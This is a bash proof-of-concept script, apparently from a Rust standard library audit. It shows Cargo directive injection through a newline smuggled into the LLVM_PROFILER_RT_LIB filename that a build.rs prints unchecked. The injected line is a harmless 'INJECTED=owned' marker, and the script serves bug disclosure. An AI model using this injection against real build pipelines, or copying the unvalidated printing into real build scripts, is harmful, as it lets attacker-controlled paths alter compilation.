#!/usr/bin/env bash
# Bug: profiler_builtins/build.rs prints LLVM_PROFILER_RT_LIB's filename component into a
#      `cargo::rustc-link-lib=static:+verbatim=...` line without rejecting newlines, allowing
#      directive injection via filenames containing \n.
# Expected: build.rs rejects newlines in the library filename component before printing.
# Observed: build script emits an injected `cargo::rustc-env=INJECTED=owned` directive on its own line.
# Build/run:
#   bash /Users/j/src/swival-audits/rust-stdlib/pocs/028-cargo-directive-injection-via-library-filename.sh
set -eu

WORK="/private/tmp/rust/tmp/poc028"
rm -rf "$WORK"
mkdir -p "$WORK"

cat >"$WORK/build.rs" <<'EOF'
use std::path::PathBuf;
fn main() {
    if let Ok(rt) = std::env::var("LLVM_PROFILER_RT_LIB") {
        let rt = PathBuf::from(rt);
        if let Some(lib) = rt.file_name() {
            let lib = PathBuf::from(lib);
            if let Some(dir) = rt.parent() {
                println!("cargo::rustc-link-search=native={}", dir.display());
            }
            println!("cargo::rustc-link-lib=static:+verbatim={}", lib.to_str().unwrap());
            return;
        }
    }
}
EOF

INJECTED_FILENAME=$'libdoesnotmatter.a\ncargo::rustc-env=INJECTED=owned'
export LLVM_PROFILER_RT_LIB="/tmp/$INJECTED_FILENAME"

cd "$WORK"
OUT="$(rustc --edition=2021 build.rs -o build_script 2>&1)"
./build_script > stdout.log

echo "--- captured build script stdout ---"
cat stdout.log
echo "------------------------------------"

if grep -q '^cargo::rustc-env=INJECTED=owned$' stdout.log; then
    echo "BUG TRIGGERED: injected directive present on its own line"
    exit 0
else
    echo "UNEXPECTED: injection did not appear" >&2
    exit 1
fi
